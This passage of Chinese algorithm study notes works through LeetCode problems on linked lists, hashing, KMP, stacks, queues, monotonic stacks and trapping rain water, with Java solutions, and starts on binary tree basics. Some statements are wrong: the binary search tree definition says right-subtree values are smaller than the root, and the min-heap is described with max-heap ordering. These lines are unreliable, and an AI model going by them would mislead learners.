result;&#125;\n\n虚拟头节点链表删除元素的操作有两种操作方式：\n\n直接使用原链表执行删除操作\n设置一个虚拟头节点再执行删除操作\n\n对于第一种操作方式，删除头节点和删除其它节点的操作是不一样的，因为链表中其它节点是通过前一个节点来删除的，而头节点没有前一个节点，在这种操作方式下，头节点的删除是通过将头节点向后移实现的。\n对于第二种操作方式，为链表设置一个虚拟头节点后，原链表的所有节点都可以按照统一的方式删除。\n移除链表元素用法示例（力扣203. 移除链表元素：删除链表中指定值的节点）：\npublic ListNode removeElements(ListNode head, int val) &#123;\tListNode dummyHead = new ListNode(0);\t//将虚拟头节点的next指向head\tdummyHead.next = head;\tListNode cur = dummyHead;\twhile (cur.next != null) &#123;\t\tif (cur.next.val == val) &#123;\t\t\tcur.next = cur.next.next;\t\t&#125; else &#123;\t\t\tcur = cur.next;\t\t&#125;\t&#125;\t//dummyHead.next是链表执行删除节点后的头节点\treturn dummyHead.next;&#125;\n\n删除链表的倒数第 N 个结点用法示例（力扣19. 删除链表的倒数第 N 个结点：使用双指针法和虚拟头节点实现删除链表后部的第n个节点）：\npublic ListNode removeNthFromEnd(ListNode head, int n) &#123;\t//此处之所以使用dummyHead，是为了统一删除逻辑\tListNode dummyHead = new ListNode(0);\tdummyHead.next = head;\t//如果要删除倒数第n个节点，则让fast从dummyHead向前移动n+1步，然后让fast和slow同时移动，\t//直到fast指向链表末尾，此时slow指向的就是被删除节点的上一个节点\tListNode fast = dummyHead;\tListNode slow = dummyHead;\t//之所以是前移n+1步，是为了保证slow和fast之间的距离是n+1，即保证slow指向被删除节点的上一个节点\twhile (n-- &gt;= 0) &#123; //此处没有处理异常，如需要可在循环内添加处理操作\t\tfast = fast.next;\t&#125;\twhile (fast != null) &#123;\t\tfast = fast.next;\t\tslow = slow.next;\t&#125;   \t//统一后的删除操作\tslow.next = slow.next.next;\treturn dummyHead.next;&#125;\n\n哈希法如果在做算法题目时，遇到需要判断元素是否出现过，或统计出现次数的场景，则应该想到使用哈希法。\nJava中哈希法使用到的数据结构包含以下几种：\n\n数组：适合处理元素数量有限的场景。\nHashSet：只适合判断元素是否出现过的场景。\nHashMap：可以处理所有哈希法的适用场景。如果数组和HashSet能够处理，则往往使用数组和HashSet更加方便和高效，此时应优先使用数组和HashSet。\n数组、HashSet、HashMap的“扩展类”，如List、TreeSet、TreeMap等。\n\n有效的字母异位词用法示例（力扣242. 有效的字母异位词：判断是否能通过0次或多次改变字符顺序，使两个字符串中的字符一致，两个字符串都只包含小写字母）：\n处理思路是，选择数组作为哈希法的数据结构，用于统计字母出现的次数；遍历第一个字符串，每遍历一个字母，就对该字母出现的次数加1；遍历第二个字符串，每遍历一个字母，就对该字母出现的次数减1，最后遍历统计字母的出现次数的数组，判断是否所有元素都为0，既不大于0，也不小于0，就说明两个字符串中字母出现的次数是一致的。\npublic boolean isAnagram(String s, String t) &#123;\tif (s.length() != t.length()) &#123;\t\treturn false;\t&#125;\t//选择数组作为哈希法的数据结构，用于统计字母出现的次数\tint[] counts = new int[26];\tint length = s.length();\tfor (int i = 0; i &lt; length; i++) &#123;        //遍历第一个字符串，每遍历一个字母，就对该字母出现的次数加1\t\tcounts[s.charAt(i) - &#x27;a&#x27;]++;        //遍历第二个字符串，每遍历一个字母，就对该字母出现的次数减1\t\tcounts[t.charAt(i) - &#x27;a&#x27;]--;\t&#125;\t//最后遍历统计字母的出现次数的数组，判断是否所有元素都为0\tfor (int count : counts) &#123;\t\tif (count != 0) &#123;\t\t\treturn false;\t\t&#125;\t&#125;\t//所有元素都为0，说明两个字符串中字母出现的次数是一致的\treturn true;&#125;\n\n两个数组的交集用法示例（力扣349. 两个数组的交集：求两个的数组的元素交集，数组中int类型的元素的取值没有限制）：\n由于数组的int类型的元素值是没有限制的，且交集是没有重复元素的，需要去重，且不需要统计出现的次数，所以选择使用HashSet作为哈希法的数据结构。\npublic int[] intersection(int[] nums1, int[] nums2) &#123;    //int[]转HashSet\tSet&lt;Integer&gt; set = Arrays.stream(nums1).boxed().collect(Collectors.toSet());\tSet&lt;Integer&gt; resultSet = new HashSet&lt;&gt;();\tfor (int num : nums2) &#123;\t\tif (set.contains(num)) &#123;\t\t\tresultSet.add(num);\t\t&#125;\t&#125;    //HashSet转int[]\treturn resultSet.stream().mapToInt(Integer::intValue).toArray();&#125;\n\n两数之和用法示例（力扣1. 两数之和：在数组中寻找两个元素，使其和等于目标值，返回这两个元素的下标）：\n因为元素值没有限制，且需要记录下标位置，所以选择使用HashMap。\npublic int[] twoSum(int[] nums, int target) &#123;\tMap&lt;Integer, Integer&gt; map = new HashMap&lt;&gt;();\tfor (int i = 0; i &lt; nums.length; i++) &#123;\t\tint num = nums[i];\t\tint subNum = target - num;        //看是否存在差值\t\tif (map.containsKey(subNum)) &#123;\t\t\treturn new int[]&#123;i, map.get(subNum)&#125;;\t\t&#125;\t\tmap.put(num, i);\t&#125;\treturn new int[]&#123;&#125;;&#125;\n\n四数相加用法示例（力扣454. 四数相加 II：找出四个数组中的元素和等于0的组合，允许有重复组合，返回组合总数）：\n解题思路是，选择使用HashMap作为哈希法的数据结构，先遍历其中两个数组，将两个数组的两数之和，以及两数之和出现的次数作为key-value对存储到HashMap；再遍历另外两个数组，两个数组的两数之和取负值后，如果在HashMap中存在，则在总数上加HashMap中记录的两数之和的出现次数。\npublic int fourSumCount(int[] nums1, int[] nums2, int[] nums3, int[] nums4) &#123;\tMap&lt;Integer, Integer&gt; counts = new HashMap&lt;&gt;();\tfor (int num1 : nums1) &#123;\t\tfor (int num2 : nums2) &#123;            //两个数组的两数之和\t\t\tint num = num1 + num2;            //将两数之和及出现的次数作为key-value对存储到HashMap\t\t\tcounts.put(num, counts.getOrDefault(num, 0) + 1);\t\t&#125;\t&#125;\tint sum = 0;\tfor (int num3 : nums3) &#123;\t\tfor (int num4 : nums4) &#123;            //统计-(num3 + num4)出现的总数\t\t\tsum += counts.getOrDefault(-(num3 + num4), 0);\t\t&#125;\t&#125;\treturn sum;&#125;\n\nKMP算法KMP算法主要应用在字符串匹配的场景中，核心思想是当出现字符串不匹配的情况时，可以利用模式串的文本信息，避免再从头匹配。在KMP算法中，该文本信息记录在next数组中。next数组是一个前缀表（prefix table），或者是前缀表的某种变形（如前缀表的元素统一减一后的前缀表、前缀表元素整体后移一位并在0位补-1），前缀表记录的是最长相同前后缀的长度的信息。根据前缀表，可以得知当模式串与文本串不匹配时，应该从模式串的哪个位置开始继续遍历匹配，既不会遍历到不可能存在匹配子串的部分，又不会漏掉可能存在匹配子串的部分。\n如何计算前缀表（最长相同前后缀是长度表）\n前缀表就是从当前下标往前的所有模式串字符的最长相同前后缀的长度。\n计算方法是：定义两个指针i和j，i用于遍历next数组，j用于指向模式串的下标，j需要更新到满足条件，模式串(i - j, i]范围内的子串，与模式串[0, j)范围内的子串匹配，当满足这一条件时，填充next[i]&#x3D;j，即从i位置向前数j个元素是i位置的最长相同前后缀。为满足这一条件，会在前后缀字符不匹配时，使用next数组已经得到的部分结果更新j的值。\n以模式串acbacf为例，计算前缀表的结果：\n\n\n\n前缀子串\n前缀\n后缀\n匹配的子串\ni\nj\n最长相同前后缀的长度\n\n\n\nac\n\n\n\n\n\n0\n\n\nacb\n\n\n\n\n\n0\n\n\nacba\naxxx\nxxxa\na\n3\n1\n1\n\n\nacbac\nacxxx\nxxxac\nac\n4\n2\n2\n\n\nacbacf\n\n\n\n\n\n0\n\n\n得出模式串acbacf的前缀表为[0, 0, 0, 1, 2, 0]。\n如何使用前缀表\n在while循环中判断，模式串的下标j处和文本串的下标i处字符是否匹配，如果不匹配，则更新j的值，使j&#x3D;next[j-1]，当然，循环条件中还要有j是否大于0，如果j小于等于0，j-1就是负数，下标越界，所以j需要大于0。\n时间复杂度分析\n设m为模式串的长度，n为文本串的长度，KMP算法中生成模式串的时间复杂度为O(m)，进行字符串匹配的时间复杂度是O(n)，所以总的时间复杂度是O(n+m)；而暴力解法的时间复杂度是O(n×m)，所以KMP大大加快了字符串匹配的速度。\n寻找匹配的子串用法示例（力扣28. 找出字符串中第一个匹配项的下标：在文本串中查找模式串匹配子串的起始下标（第一个字符的位置），如果没有匹配的子串返回-1）：\n这种字符串匹配的题目是KMP的典型题目类型，处理思路是首先计算出next数组（前缀表或前缀表的变形），然后在模式串和文本串字符不一致的情况下，根据next数组移动模式串指针。计算next数组的过程和寻找子串的过程的代码类似，都包含了处理前后缀字符不相等情况的操作和处理前后缀字符相等情况的操作。\npublic int strStr(String haystack, String needle) &#123;\tint m = needle.length();\tint n = haystack.length();\t//如果模式串的长度大于文本串则文本串一定不包含和模式串一样的子串\tif (m &gt; n) &#123;\t\treturn -1;\t&#125;\t//构造next数组\tint[] next = getNext(needle);  \t//i指向文本串的起始位置，j指向模式串的起始位置\tfor (int i = 0, j = 0; i &lt; n; i++) &#123;\t\t//处理模式串和文本串子串字符不一致的情况\t\twhile (j &gt; 0 &amp;&amp; haystack.charAt(i) != needle.charAt(j)) &#123;\t\t\t//使用前缀表            j = next[j - 1];\t\t&#125;\t\tif (haystack.charAt(i) == needle.charAt(j)) &#123;\t\t\tj++;\t\t&#125;\t\t//找到匹配的子串\t\tif (j == needle.length()) &#123;\t\t\treturn (i - needle.length() + 1);\t\t&#125;\t&#125;\treturn -1;&#125;private int[] getNext(String s) &#123;\tint[] next = new int[s.length()];\t//i用来逐渐扩大前缀表的范围，j用来寻找最长前缀的下标\tfor (int i = 1, j = 0; i &lt; s.length(); i++) &#123;\t\t//处理前后缀字符不相等的情况，直到前后缀字符相等（包括了前后缀长度为0，即j=0）\t\twhile (j &gt; 0 &amp;&amp; s.charAt(i) != s.charAt(j)) &#123;            //使用已经得到的部分前缀表的结果\t\t\tj = next[j - 1];\t\t&#125;\t\tif (s.charAt(i) == s.charAt(j)) &#123;            //j之前的子串相等，不包含j，即[0, j)和(i-j, i]范围内的子串匹配，\t\t\tj++;\t\t&#125;\t\t//填充最长相同前后缀的长度\t\tnext[i] = j;\t&#125;\treturn next;&#125;\n\n寻找重复的子串用法示例（力扣459. 重复的子字符串：判断一个非空字符串，是否可以通过它的一个子串重复多次（出现次数大于等于2次）构成）：\n这道题可以使用KMP算法中计算next数组的部分，原因是next数组中记录了最长相同前后缀，就可以根据next数组和判断规则判断字符串是否由重复子串构成。判断规则是，最长相同前后缀不包含的子串就是最小重复子串，如果字符串的长度能整除（length % (length - next[length - 1]) &#x3D;&#x3D; 0）最长相同前后缀不包含的子串（最小重复子串），就说明字符串由重复的子串组成。\npublic boolean repeatedSubstringPattern(String s) &#123;\tif (s.length() &lt;= 1) &#123;\t\treturn false;\t&#125;\t//KMP算法中计算next数组的部分\tint[] next = getNext(s);\tint length = s.length();\t//数组长度减去最长相同前后缀的长度相当于是第一个周期的长度，也就是一个周期的长度，如果这个周期可以被整除，就说明整个数组就是这个周期的循环。    //next[length - 1] = 0的情况也能使(length % (length - next[length - 1])=0，所以需要排除\treturn next[length - 1] != 0 &amp;&amp; (length % (length - next[length - 1]) == 0);&#125;private int[] getNext(String s) &#123;\tint[] next = new int[s.length()];\tfor (int i = 1, j = 0; i &lt; s.length(); i++) &#123;\t\twhile (j &gt; 0 &amp;&amp; s.charAt(i) != s.charAt(j)) &#123;\t\t\tj = next[j - 1];\t\t&#125;\t\tif (s.charAt(i) == s.charAt(j)) &#123;\t\t\tj++;\t\t&#125;\t\tnext[i] = j;\t&#125;\treturn next;&#125;\n\n栈与队列用栈实现队列用法示例（力扣232. 用栈实现队列：使用栈数据结构实现队列的功能）：\n思路：这是一道模拟题，不涉及具体算法，考察的就是对栈和队列的掌握程度。要用栈模拟队列（先进先出）的功能，需要两个栈，一个是输入栈，一个是输出栈。在push时只需要将数据放入输入栈，在pop时如果输出栈没有数据，就把输入栈的全部元素移动到输出栈，如果输出栈中有数据，则直接从输出栈中弹出数据。如果输入栈和输出栈都为空，则说明队列是否为空。\nDeque&lt;Integer&gt; inputStack;Deque&lt;Integer&gt; outputStack;public MyQueue() &#123;\tinputStack = new LinkedList&lt;&gt;();\toutputStack = new LinkedList&lt;&gt;();&#125;public void push(int x) &#123;\tinputStack.add(x);&#125;public int pop() &#123;\tif (outputStack.isEmpty()) &#123;\t\tmove();\t\tif (outputStack.isEmpty()) &#123;\t\t\treturn -1;\t\t&#125;\t&#125;\treturn outputStack.pop();&#125;public void move() &#123;    //如果输入队列也是0，则不需要移动数据，直接返回\tif (inputStack.isEmpty()) &#123;\t\treturn;\t&#125;\t//通过交换对象的指向，模拟将输入栈的全部元素移动到输出栈\tDeque&lt;Integer&gt; temp = inputStack;\tinputStack = outputStack;\toutputStack = temp;&#125;public int peek() &#123;\tif (outputStack.isEmpty()) &#123;        //如果为输出栈为空，将输入栈的全部元素移动到输出栈\t\tmove();        //如果移动之后，输出栈依然为空，说明栈中没有元素\t\tif (outputStack.isEmpty()) &#123;\t\t\treturn -1;\t\t&#125;\t&#125;\treturn outputStack.peek();&#125;public boolean empty() &#123;\treturn inputStack.isEmpty() &amp;&amp; outputStack.isEmpty();&#125;\n\n用队列实现栈用法示例（力扣225. 用队列实现栈：使用队列数据结构实现栈的功能）：\n思路：用队列实现栈既可以使用两个队列也可以使用一个队列实现。如果使用两个队列实现栈，由于队列的数据移动不会改变数据的顺序，所以两个队列没有输入队列和输出队列的关系，另一个队列是用来备份头部数据（除最后一个元素外的数据）的。如果使用一个队列，在弹出元素时，只需要将队列头部数据添加到队列的尾部。\n使用两个队列实现栈：\nDeque&lt;Integer&gt; optionQueue;Deque&lt;Integer&gt; backupQueue;public Code_018_QueueToStack() &#123;\toptionQueue = new LinkedList&lt;&gt;();\tbackupQueue = new LinkedList&lt;&gt;();&#125;public void push(int x) &#123;\toptionQueue.addLast(x);&#125;public int pop() &#123;    if (optionQueue.isEmpty()) &#123;\t\treturn -1;\t&#125;\tint size = optionQueue.size() - 1;\t//将头部数据（除最后一个元素外的数据）移到备份队列\twhile (size-- &gt; 0) &#123;\t\tbackupQueue.addLast(optionQueue.pollFirst());\t&#125;\tint result = optionQueue.pollFirst();\t//移回数据\twhile (!backupQueue.isEmpty()) &#123;\t\toptionQueue.addLast(backupQueue.pollFirst());\t&#125;\treturn result;&#125;public int top() &#123;    if (optionQueue.isEmpty()) &#123;\t\treturn -1;\t&#125;\tint size = optionQueue.size() - 1;\twhile (size-- &gt; 0) &#123;\t\tbackupQueue.addLast(optionQueue.pollFirst());\t&#125;\tint result = optionQueue.peekFirst();\t//将最后一个元素移到备份队列，以维护顺序不变\tbackupQueue.addLast(optionQueue.pollFirst());    //移回数据\twhile (!backupQueue.isEmpty()) &#123;\t\toptionQueue.addLast(backupQueue.pollFirst());\t&#125;\treturn result;&#125;public boolean empty() &#123;\treturn optionQueue.isEmpty() &amp;&amp; backupQueue.isEmpty();&#125;\n\n使用一个队列实现栈：\nDeque&lt;Integer&gt; queue;public MyStack() &#123;\tqueue = new LinkedList&lt;&gt;();&#125;public void push(int x) &#123;\tqueue.add(x);&#125;public int pop() &#123;    if (queue.isEmpty()) &#123;\t\treturn -1;\t&#125;\tint size = queue.size() - 1;    //将队列头部数据（除最后一个元素外的数据）重新添加到队列的尾部\twhile (size-- &gt; 0) &#123;\t\tqueue.addLast(queue.pollFirst());\t&#125;\treturn queue.pollFirst();&#125;public int top() &#123;    if (queue.isEmpty()) &#123;\t\treturn -1;\t&#125;\tint size = queue.size() - 1;\twhile (size-- &gt; 0) &#123;\t\tqueue.addLast(queue.pollFirst());\t&#125;\tInteger result = queue.peekFirst();    //将最后一个元素添加到队列的尾部，以维护顺序不变\tqueue.addLast(queue.pollFirst());\treturn result;&#125;public boolean empty() &#123;\treturn queue.isEmpty();&#125;\n\n括号匹配用法示例（力扣20. 有效的括号：判断由()[]{}六个括号字符构成的字符串，里面的括号是否正确匹配）：\n括号匹配是使用栈解决的经典问题。在编译原理中，编译器在词法分析的过程中，处理括号、花括号等符号的逻辑也使用了栈这种数据结构。\n思路：首先分析三种不配的情况，第一种情况是，字符串的左括号多余；第二种情况是，括号没有多余但类型不匹配；第三种情况是，字符串的右括号多余。代码只需要覆盖这三种不匹配的情况。\n\n第一种情况：遍历完字符串后，发现栈不为空，说明出现了有左括号没有右括号的情况。\n第二种情况：在遍历字符串的过程中，发现栈中没有匹配的字符，说明出现了括号类型不匹配的情况。\n第三种情况：在遍历字符串的过程中，发现栈已经为空，没有左括号来匹配右括号，说明出现了有右括号没有左括号的情况。\n\n//此处作为栈使用Deque&lt;Character&gt; stack = new ArrayDeque&lt;&gt;();for (int i = 0; i &lt; s.length(); i++) &#123;\tchar c = s.charAt(i);\t//左括号\tif (c == &#x27;(&#x27;) &#123;\t\t//填入正确匹配情况下期望的右括号，而不是填入左括号，这种处理方法可以直接在添加数据的时候确定括号匹配关系，而不需要后续每次弹出数据的时候判断应该匹配哪个括号\t\tstack.push(&#x27;)&#x27;);\t&#125; else if (c == &#x27;&#123;&#x27;) &#123;\t\tstack.push(&#x27;&#125;&#x27;);\t&#125; else if (c == &#x27;[&#x27;) &#123;\t\tstack.push(&#x27;]&#x27;);\t//右括号\t&#125; else if (stack.isEmpty() || stack.peek() != s.charAt(i)) &#123;\t\t//(第三种情况，栈已经为空，没有左括号来匹配右括号 || 第二种情况，括号类型不匹配)\t\treturn false;\t&#125; else &#123;\t\t//正确匹配，删除右括号\t\tstack.pop();\t&#125;&#125;//第一种情况，有左括号，没有右括号return stack.isEmpty();\n\n逆波兰表达式用法示例（力扣150. 逆波兰表达式求值：计算给出的波兰表达式的值，逆波兰表达式即后缀表达式）：\n逆波兰表达式相当于二叉树中的后序遍历。可以把运算符作为中间节点，按照后序遍历的规则画出二叉树，逆波兰表达式就是这个二叉树的后序遍历结果。\n我们习惯看到的表达式都是中缀表达式，但是中缀表达式对于计算机来说不太友好，因为部分中缀表达式需要计算机考虑运算符的优先级，而后缀表达式自带运算顺序，不需要计算机考虑运算符优先级。例如中缀表达式4+13&#x2F;5，需要考虑先计算+还是先计算&#x2F;，而其后缀表达式4,13,5,&#x2F;,+，不需要再考虑顺序问题，只需要按照同样的计算顺序计算即可。\npublic int evalRPN(String[] tokens) &#123;\tDeque&lt;Integer&gt; stack = new ArrayDeque&lt;&gt;();\tfor (String token : tokens) &#123;\t\t//如果是+-*/，就执行计算；如果是数值，就加入栈\t\tif (token.equals(&quot;+&quot;) || token.equals(&quot;-&quot;) || token.equals(&quot;*&quot;) || token.equals(&quot;/&quot;)) &#123;\t\t\tint num1 = stack.pop();\t\t\tint num2 = stack.pop();\t\t\tif (token.equals(&quot;+&quot;)) &#123;\t\t\t\tstack.push(num2 + num1);\t\t\t&#125; else if (token.equals(&quot;-&quot;)) &#123;\t\t\t\t//栈是先进后出，所以num2才是表达式前面的数\t\t\t\tstack.push(num2 - num1);\t\t\t&#125; else if (token.equals(&quot;*&quot;)) &#123;\t\t\t\tstack.push(num2 * num1);\t\t\t&#125; else &#123;\t\t\t\tstack.push(num2 / num1);\t\t\t&#125;\t\t&#125; else &#123;\t\t\tstack.push(Integer.parseInt(token));\t\t&#125;\t&#125;\t//栈中最后一个元素就是结果\treturn stack.pop();&#125;\n\n滑动窗口最大值（单调队列）用法示例（力扣239. 滑动窗口最大值：一个大小为k的滑动窗口，在数组上滑动，计算滑动窗口每移动一次时窗口中数组元素的最大值）：\n思路：此题需要一个队列，能够实现添加元素、弹出元素、返回队列中的最大值。不过这种队列没有现成的数据结构，需要自行实现。为实现返回队列中的最大值这一功能，不需要维护窗口中的所有元素，只需要维护窗口中的由大到小（单调递减）的最大值元素即可。\n维护元素单调递减或单调递增的队列就叫做单调队列。单调队列不是对窗口的元素排序，如果是对元素进行排序，那么和优先级队列就没有区别了。\n如果是单调递减队列，以窗口{2, 3, 5, 1, 4}为例，只维护{5, 4}就够了。\nprivate class MyQueue &#123;\t//作为双端队列使用\tDeque&lt;Integer&gt; deque = new LinkedList&lt;&gt;();\tpublic void pop(int num) &#123;\t\t//判断要移除的窗口元素值，是否等于队列出口元素值，如果等于则弹出队列出口元素\t\tif (!deque.isEmpty() &amp;&amp; num == deque.peekFirst()) &#123;\t\t\tdeque.pollFirst();\t\t&#125;\t&#125;\tpublic void push(int num) &#123;\t\t//维护单调递减队列，注意是跟队列尾部比较，删除的也是队列尾部\t\twhile (!deque.isEmpty() &amp;&amp; num &gt; deque.peekLast()) &#123;\t\t\tdeque.pollLast();\t\t&#125;\t\tdeque.addLast(num);\t&#125;\tpublic int front() &#123;\t\tif (deque.isEmpty()) &#123;\t\t\treturn -1;\t\t&#125;\t\treturn deque.peekFirst();\t&#125;&#125;public int[] maxSlidingWindow(int[] nums, int k) &#123;\tif (nums.length == 1) &#123;\t\treturn nums;\t&#125;\tMyQueue myQueue = new MyQueue();\tint[] result = new int[nums.length - k + 1];\tint index = 0;\t//将前k个元素放入队列\tfor (int i = 0; i &lt; k; i++) &#123;\t\tmyQueue.push(nums[i]);\t&#125;\t//记录窗口内元素的最大值\tresult[index++] = myQueue.front();\t//滑动窗口\tfor (int i = k; i &lt; nums.length; i++) &#123;\t\t//移除滑动窗口最前面的元素\t\tmyQueue.pop(nums[i - k]);\t\tmyQueue.push(nums[i]);\t\t//记录窗口内元素的最大值\t\tresult[index++] = myQueue.front();\t&#125;\treturn result;&#125;\n\n前k个高频元素（堆）用法示例（力扣347. 前 K 个高频元素：在数组中找出出现频率前k高的元素）：\n思路：使用HashMap统计元素出现次数，然后使用优先级队列对出现次数排序。Java中优先级队列PriorityQueue默认使用小顶堆（二叉树中父节点的值大于等于左右孩子的值）对元素排序。\npublic int[] topKFrequent(int[] nums, int k) &#123;\t//用于统计元素出现次数\tMap&lt;Integer, Integer&gt; counts = new HashMap&lt;&gt;();\tfor (int num : nums) &#123;\t\tcounts.put(num, counts.getOrDefault(num, 0) + 1);\t&#125;\t//大顶堆，元素类型是数组，键值对可以使用长度为2的数组存储，不只是Map能存\tPriorityQueue&lt;int[]&gt; priorityQueue = new PriorityQueue&lt;&gt;((pair1, pair2) -&gt; pair2[1] - pair1[1]);\t//根除出现次数堆元素进行排序\tfor (Map.Entry&lt;Integer, Integer&gt; entry : counts.entrySet()) &#123;\t\tpriorityQueue.add(new int[]&#123;entry.getKey(), entry.getValue()&#125;);\t&#125;\tint[] result = new int[k];\tfor (int i = 0; i &lt; k; i++) &#123;\t\tresult[i] = priorityQueue.poll()[0];\t&#125;\treturn result;&#125;\n\n每日温度（单调栈）用法示例（力扣739. 每日温度：根据每日温度数组，得出在数组的每个位置，要想观测到后续出现更高的温度，需要等待的最小天数）：\n这道题可以使用单调栈解决，如何判断能否使用单调栈？通常是一维数组，要寻找任意一个元素的右边或者左边比自己大或者小的元素的位置，此时就要想到可以使用单调栈。单调栈的时间复杂度为O(n)。\n这道题其实就是，要寻找任意一个元素的右边比当前元素大的元素，所以应该想到使用单调栈。\n单调栈的本质是空间换时间，使用了一个栈来记录遍历过的元素信息。\n使用单调栈前需要明确的两个点：\n\n单调栈里存放的是什么：单调栈里存放的是元素的下标。\n单调栈是递增的还是递减的：\n如果求的是一个元素左边或右边第一个更大的元素，则单调栈是递增的。\n如果求的是一个元素左边或右边第一个更小的元素，则单调栈是递减的。\n\n\n\n这道题解法的具体操作是，如果当前元素大于栈顶元素，就把栈顶删除，加入当前元素；如果当前元素小于等于栈顶元素，则加入当前元素，可见栈顶一定是当前元素的下标。\npublic int[] dailyTemperatures(int[] temperatures) &#123;\tint length = temperatures.length;\tint[] result = new int[length];\t//作为单调栈使用\tDeque&lt;Integer&gt; stack = new LinkedList&lt;&gt;();\t//单调栈里存放的是元素的下标\tfor (int i = 0; i &lt; length; i++) &#123;\t\twhile(!stack.isEmpty() &amp;&amp; temperatures[i] &gt; temperatures[stack.peek()]) &#123;\t\t\t//对于stack.peek()下标下的温度，后续出现更高的温度，需要等待的最小天数\t\t\tresult[stack.peek()] = i - stack.peek();            stack.pop();            //简写形式            //result[stack.peek()] = i - stack.pop();\t\t&#125;\t\t//栈顶一定是当前元素的下标\t\tstack.push(i);\t&#125;\treturn result;&#125;\n\n接雨水用法示例（力扣42. 接雨水：求一排宽度为1、高度为n的柱子，可以接到的雨水的面积）：\n双指针解法使用双指针的解法下有两种计算面积的方式，一种是按照行计算，一种是按照列计算，两种方法都可以使用，只不过要始终按照一个方向计算。以按照列计算为例，即计算每一列的左右两侧最矮高度。\npublic int trap(int[] height) &#123;\tint sum = 0;\t//第一个柱子和最后一个柱子不接雨水\tfor (int i = 1; i &lt; height.length - 1; i++) &#123;\t\tint leftHeight = height[i];\t\tint rightHeight = height[i];\t\t//寻找左侧柱子高度\t\tfor (int l = i - 1; l &gt;= 0; l--) &#123;\t\t\tif (height[l] &gt; leftHeight) &#123;\t\t\t\tleftHeight = height[l];\t\t\t&#125;\t\t&#125;\t\t//寻找右侧柱子高度\t\tfor (int r = i + 1; r &lt; height.length; r++) &#123;\t\t\tif (height[r] &gt; rightHeight) &#123;\t\t\t\trightHeight = height[r];\t\t\t&#125;\t\t&#125;\t\t//要减去当前柱子的高度\t\tint h = Math.min(leftHeight, rightHeight) - height[i];\t\t//接雨水的面积大于0才有效\t\tif (h &gt; 0) &#123;\t\t\tsum += h;\t\t&#125;\t&#125;\treturn sum;&#125;\n\n动态规划解法可以看到，在双指针解法中，为了得到每个柱子两边的最大柱子边界的高度，每次都会将全部柱子遍历一遍，这其实是有重复计算的。可以使用动态规划法，先遍历两次，第一次将每个位置的左边最高高度记录在一个数组中，第二次将右边最高高度记录在另一个数组中，后续就可以直接使用最高高度信息，避免了重复计算。\npublic int trap(int[] height) &#123;\tint length = height.length;\t//记录每个柱子左边的最大柱子高度\tint[] maxLeft = new int[length];\t//处理边界\tmaxLeft[0] = height[0];    //从左到右递增\tfor (int i = 1; i &lt; length; i++) &#123;\t\t//当前位置左边（包含当前位置，下标范围是[0, i]）最高高度是前一个位置的左边最高高度和当前柱子最高高度中的最大值\t\tmaxLeft[i] = Math.max(height[i], maxLeft[i - 1]);\t&#125;\t//记录每个柱子右边的最大柱子高度\tint[] maxRight = new int[length];\t//处理边界\tmaxRight[length - 1] = height[length - 1];\tfor (int i = length - 2; i &gt;= 0; i--) &#123;\t\t//当前位置右边（包含当前位置，下标范围是[i, length - 1]）最高高度是后一个位置的右边最高高度和当前柱子最高高度中的最大值\t\tmaxRight[i] = Math.max(height[i], maxRight[i + 1]);\t&#125;\t//下面的操作和双指针中的操作逻辑一致\tint sum = 0;    //从右到左递增\tfor (int i = 1; i &lt; length - 1; i++) &#123;\t\tint h = Math.min(maxLeft[i], maxRight[i]) - height[i];\t\tif (h &gt; 0) &#123;\t\t\tsum += h;\t\t&#125;\t&#125;\treturn sum;&#125;\n\n单调栈解法与前两种解法不同，这道题的单调栈解法是按照行的方向计算雨水面积，因为单调栈存储的是元素的下标，所以能通过单调栈确定左右两侧柱子的距离差和高度差，从而求出面积。其实就是栈顶和栈顶的下一个元素以及要入栈的元素，三个元素来接水！\n在入栈过程中有三种情况：\n\n入栈的元素小于栈顶元素，则将元素的索引入栈。\n入栈的元素等于栈顶元素，则将栈顶出栈，将当前元素的索引入栈。之所以要将栈顶出栈，是因为单调栈内的元素的索引是作为左边界出现的，两个高度相等的相邻的柱子，左边一个是不能存放雨水的。\n入栈的元素大于栈顶元素，则将栈顶元素弹出，并计算由栈顶和栈顶的下一个元素以及要入栈的元素，所组成的行方向上的面积。\n\npublic int trap(int[] height) &#123;\tif (height.length &lt;= 2) &#123;\t\treturn 0;\t&#125;\tDeque&lt;Integer&gt; stack = new LinkedList&lt;&gt;();\tint sum = 0;\tfor (int i = 0; i &lt; height.length; i++) &#123;\t\tif (!stack.isEmpty() &amp;&amp; height[i] == height[stack.peek()]) &#123;\t\t\t//因为单调栈内的元素的索引是作为左边界出现的，所以两个相等的相邻柱子中，左边一个是不能存放雨水的\t\t\tstack.pop();\t\t&#125; else &#123;\t\t\t//入栈的元素大于栈顶元素\t\t\twhile (!stack.isEmpty() &amp;&amp; height[i] &gt; height[stack.peek()]) &#123;\t\t\t\t//将栈顶元素弹出\t\t\t\tInteger mid = stack.pop();\t\t\t\t//计算由栈顶和栈顶的下一个元素以及要入栈的元素，所组成的行方向上的面积\t\t\t\tif (!stack.isEmpty()) &#123;\t\t\t\t\tint left = stack.peek();\t\t\t\t\t//右边界减左边界，再减一就是行面积中的的长度\t\t\t\t\tint w = i - left - 1;\t\t\t\t\t//行面积中的高度\t\t\t\t\tint h = Math.min(height[i], height[left]) - height[mid];\t\t\t\t\tif (h &gt; 0) &#123;\t\t\t\t\t\tsum += w * h;\t\t\t\t\t&#125;\t\t\t\t&#125;\t\t\t&#125;\t\t&#125;\t\tstack.push(i);\t&#125;\treturn sum;&#125;\n\n二叉树二叉树的种类：\n\n满二叉树：如果一棵二叉树只有度为0的节点和度为2的节点，并且度为0的节点在同一层上，则这棵二叉树为满二叉树。\n完全二叉树：如果一棵二叉树除了底层可能没填满，其余每层的节点数都达到最大值，并且底层的节点都集中在该层最左边的若干位置，则这棵二叉树为完全二叉树。\n二叉搜索树：满二叉树和完全二叉树中的对节点的数值没有要求，而二叉搜索树对数值有要求，要求如果节点的左子树不为空，则左子树上的所有节点的值均小于它的根节点的值；如果节点的右子树不为空，右子树上的所有节点的值均小于它的根节点的值。\n平衡二叉搜索树（又称AVL树）：在二叉搜索树的基础上加了一个条件，要求如果不是空树，则左右两个子树的高度差绝对值不超过1。\n\n二叉树的存储方式：\n二叉树既可以链式存储，又可以顺序存储。链式存储方式使用的是指针，顺序存储方式使用的是数组。\n用数组存储的二叉树如何遍历：如果父节点的数组下标是i，则它的左节点的下标就是i*2+1，右节点 